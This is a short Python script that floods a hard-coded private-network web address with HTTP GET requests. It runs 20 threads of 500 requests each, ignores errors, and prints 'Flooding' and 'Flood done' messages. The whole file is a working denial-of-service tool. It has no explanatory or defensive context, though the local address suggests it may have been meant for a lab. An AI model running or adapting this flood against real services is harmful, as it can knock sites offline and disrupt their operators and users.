import requests
import threading

TARGET = "http://192.168.1.236:8000"
DURATION_REQUESTS = 500
THREADS = 20

def flood():
    session = requests.Session()
    for _ in range(DURATION_REQUESTS):
        try:
            session.get(TARGET, timeout=1)
        except requests.RequestException:
            pass
print(f"Flooding {TARGET} with {THREADS} threads")

workers = []
for _ in range(THREADS):
    t = threading.Thread(target=flood)
    t.start()
    workers.append(t)
for t in workers:
    t.join()
print("Flood done")